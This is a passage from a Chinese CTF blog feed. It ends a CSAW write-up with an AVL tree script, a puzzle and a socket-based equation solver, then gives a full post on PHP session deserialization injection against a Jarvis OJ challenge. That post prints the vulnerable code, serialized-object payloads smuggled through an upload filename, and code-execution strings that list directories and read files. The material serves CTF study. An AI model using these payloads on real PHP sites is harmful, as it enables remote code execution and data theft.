node.left</span><br><span class="line">        node.left = r</span><br><span class="line">        r.height = self.__Max(self.getHeight(r.right), self.getHeight(r.left)) + <span class="number">1</span></span><br><span class="line">        node.height = self.__Max(self.getHeight(node.right), self.getHeight(node.left)) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__LR</span><span class="params">(self,r)</span>:</span><span class="comment">#左右，先左旋再右旋</span></span><br><span class="line">        r.left=self.__RR(r.left)</span><br><span class="line">        <span class="keyword">return</span> self.__LL(r)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__RL</span><span class="params">(self,r)</span>:</span><span class="comment">#右左，先右旋再左旋</span></span><br><span class="line">        r.right=self.__LL(r.right)</span><br><span class="line">        <span class="keyword">return</span> self.__RR(r)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__insert</span><span class="params">(self,data,r)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> r==<span class="literal">None</span>:</span><br><span class="line">            node=TreeNode()</span><br><span class="line">            node.data=data</span><br><span class="line">            <span class="keyword">return</span> node</span><br><span class="line">        <span class="keyword">elif</span> data==r.data:</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> data&lt;r.data:</span><br><span class="line">            r.left=self.__insert(data,r.left)</span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.left)-self.getHeight(r.right)&gt;=<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> data&lt;r.left.data:</span><br><span class="line">                    r=self.__LL(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__LR(r)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r.right=self.__insert(data,r.right)</span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.right)-self.getHeight(r.left)&gt;=<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> data&gt;r.right.data:</span><br><span class="line">                    r=self.__RR(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__RL(r)</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.left),self.getHeight(r.right))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment"># 删除data节点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delete</span><span class="params">(self,data,r)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> r==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"don't have %d"</span>%data</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> r.data==data:</span><br><span class="line">            <span class="keyword">if</span> r.left==<span class="literal">None</span>:<span class="comment">#如果只有右子树，直接将右子树赋值到此节点</span></span><br><span class="line">                <span class="keyword">return</span> r.right</span><br><span class="line">            <span class="keyword">elif</span> r.right==<span class="literal">None</span>:<span class="comment">#如果只有左子树，直接将左子树赋值到此节点</span></span><br><span class="line">                <span class="keyword">return</span> r.left</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#如果同时有左右子树</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.left)&gt;self.getHeight(r.right):<span class="comment">#左子树高度大于右子树</span></span><br><span class="line">                    <span class="comment">#找到最右节点 返回节点值 并删除该节点</span></span><br><span class="line">                    node=r.left</span><br><span class="line">                    <span class="keyword">while</span>(node.right!=<span class="literal">None</span>):</span><br><span class="line">                        node=node.right</span><br><span class="line">                    r=self.__delete(node.data,r)</span><br><span class="line">                    r.data=node.data</span><br><span class="line">                    <span class="keyword">return</span> r</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#右子树高度大于左子树</span></span><br><span class="line">                    node=r.right</span><br><span class="line">                    <span class="keyword">while</span> node.left!=<span class="literal">None</span>:</span><br><span class="line">                        node=node.left</span><br><span class="line">                    r=self.__delete(node.data,r)</span><br><span class="line">                    r.data=node.data</span><br><span class="line">                    <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">elif</span> data&lt;r.data:</span><br><span class="line">            r.left=self.__delete(data,r.left)<span class="comment">#在左子树中删除</span></span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.right)-self.getHeight(r.left)&gt;=<span class="number">2</span>:<span class="comment">#右子树高度与左子树高度相差超过1</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.right.left)&gt;self.getHeight(r.right.right):</span><br><span class="line">                    r=self.__RL(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__RR(r)</span><br><span class="line">        <span class="keyword">elif</span> data&gt;r.data:</span><br><span class="line">            r.right=self.__delete(data,r.right)<span class="comment">#右子树中删除</span></span><br><span class="line">            <span class="keyword">if</span> self.getHeight(r.left)-self.getHeight(r.right)&gt;=<span class="number">2</span>:<span class="comment">#左子树与右子树高度相差超过1</span></span><br><span class="line">                <span class="keyword">if</span> self.getHeight(r.left.right)&gt;self.getHeight(r.left.left):</span><br><span class="line">                    r=self.__LR(r)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r=self.__LL(r)</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.left),self.getHeight(r.right))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment">#先序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__show</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root!=<span class="literal">None</span>:</span><br><span class="line">            self.result+= str(root.data)+<span class="string">","</span></span><br><span class="line">            self.__show(root.left)</span><br><span class="line">            self.__show(root.right)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Insert</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        self.root=self.__insert(data,self.root)</span><br><span class="line">        <span class="keyword">return</span> self.root</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        self.root=self.__delete(data,self.root)</span><br><span class="line">    <span class="comment">#求结点的高度</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getHeight</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> node==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="comment">#print node</span></span><br><span class="line">        <span class="keyword">return</span> node.height</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__show(self.root)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    bi=BTree()</span><br><span class="line">    array=[<span class="number">40</span>,<span class="number">84</span>,<span class="number">21</span>,<span class="number">16</span>,<span class="number">50</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">10</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">50</span>,<span class="number">76</span>,<span class="number">45</span>,<span class="number">56</span>,<span class="number">42</span>,<span class="number">6</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">21</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">47</span>,<span class="number">96</span>,<span class="number">29</span>,<span class="number">46</span>,<span class="number">97</span>,<span class="number">10</span>,<span class="number">58</span>,<span class="number">63</span>,<span class="number">83</span>,<span class="number">40</span>,<span class="number">65</span>,<span class="number">24</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">100</span>,<span class="number">11</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">61</span>,<span class="number">5</span>,<span class="number">85</span>,<span class="number">73</span>,<span class="number">49</span>,<span class="number">98</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">39</span>,<span class="number">12</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">19</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">84</span>,<span class="number">92</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">21</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">35</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">86</span>,<span class="number">10</span>,<span class="number">60</span>,<span class="number">39</span>,<span class="number">28</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">61</span>,<span class="number">6</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">38</span>,<span class="number">78</span>,<span class="number">70</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">94</span>,<span class="number">46</span>,<span class="number">10</span>,<span class="number">91</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">1</span>,<span class="number">81</span>,<span class="number">56</span>,<span class="number">21</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        bi.Insert(i)</span><br><span class="line">    bi.Show()</span><br><span class="line">    <span class="keyword">print</span> bi.result</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{HOW_WAS_IT_NAVIGATING_THAT_FOREST?}</p></blockquote><h4 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h4><blockquote><p>Start from the monkey’s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</p></blockquote><p>图片：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-a7963e27223cfe15.jpg" alt="20180915_074129.jpg"><br>题都没看懂… 太真实了</p><p>网上搜到师傅的 wp，就是一张图片，绝了：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-4c6491c4d0701a82.jpg" alt="short-circuit.jpg"><br>打扰了。</p><blockquote><p>flag:flag{owmyhand}</p></blockquote><h4 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h4><p>计算一元一次方程，开始想一个一个手算，实在算不动，太多了。写个python脚本：</p><p>因为我的那个计算算法可能会出错…所以加了捕获异常，捕获到异常直接重新连接…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(eq, var=<span class="string">"X"</span>)</span>:</span></span><br><span class="line">    eq1 = eq.replace(<span class="string">"="</span>, <span class="string">"-("</span>) + <span class="string">")"</span></span><br><span class="line">    c = eval(eq1, &#123;var: <span class="number">1j</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> (-c.real == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -c.real / c.imag</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time = <span class="number">1</span></span><br><span class="line">        sc = socket.socket()</span><br><span class="line">        host = <span class="string">"misc.chal.csaw.io"</span></span><br><span class="line">        port = <span class="number">9002</span></span><br><span class="line">        addr = (host, port)</span><br><span class="line">        sc.connect(addr)</span><br><span class="line">        <span class="keyword">print</span> sc.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-----------round &#123;&#125;--------------"</span>.format(time)</span><br><span class="line">            data = sc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">print</span> data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> data:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">if</span> time == <span class="number">1</span>:</span><br><span class="line">                shizi = data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                shizi = data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">            result = str(solve(shizi))</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"result:"</span>, result</span><br><span class="line">            sc.send(result + <span class="string">"\n"</span>)</span><br><span class="line">            time += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> BaseException:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sc.shutdown(<span class="number">2</span>)</span><br><span class="line">        sc.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP session 反序列化</title>
      <link href="/2018/10/03/PHPsession/"/>
      <url>/2018/10/03/PHPsession/</url>
      
        <content type="html"><![CDATA[<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>session就是服务器为用户浏览器创建的一个保存用户信息的文件<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。<br>session序列化与反序列化有三种方式：</p><a id="more"></a><hr><p><img src="picture1.jpg" alt="image"></p><p>php只是比php_serialize序列化多出了一个键名 ＋ 竖线 ，键名可以是空的，可以注入。  </p><h4 id="Jarvis-OJ-phpinfo"><a href="#Jarvis-OJ-phpinfo" class="headerlink" title="Jarvis OJ phpinfo"></a>Jarvis OJ phpinfo</h4><blockquote><p>看这道jarvios oj 的题：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析题目 肯定是要通过反序列化出来OowoO这个对象，把mdzz这个变量改成我们需要执行的命令。  </p><p>利用的是php的session解析不同导致的注入 ，用serialize方法序列化结果前面加个|  就是php_serialize解析的对象。<br>此题也没有传session的方法，参考帖子得知利用Session Upload Progress上传个文件,filename就可以作为session的值。  </p><p>首先我们要本地搭建环境，拿到我们想要的序列化值，代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'echo "hacker";'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果：O:5:”OowoO”:1:{s:4:”mdzz”;s:14:”echo “hacker”;”;}<br>注意这里不能把这个直接传过去，利用解析引擎不同 要在前面加个| （引号要转义）<br>也就是说 传进去的filename:|O:5:\“OowoO\“:1:{s:4:\“mdzz\“;s:14:\“echo \“hacker\“;\“;}</p><p>新建一个html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件burp抓包,把filename改为上面的payload：<br><img src="picture2.jpg" alt="image"><br>执行成功  </p><p>看一下根目录：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:35:&quot;print_r($_SERVER[&quot;DOCUMENT_ROOT&quot;]);&quot;;}  </p><p><img src="picture3.jpg" alt="image"></p><p>进去看看有什么：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:39:&quot;print_r(scandir(‘/opt/lampp/htdocs/‘));&quot;;}  </p><p><img src="picture4.jpg" alt="image"><br>  读flag:<br><img src="picture5.jpg" alt="image"></p><p>参考:  <br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/77284684</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
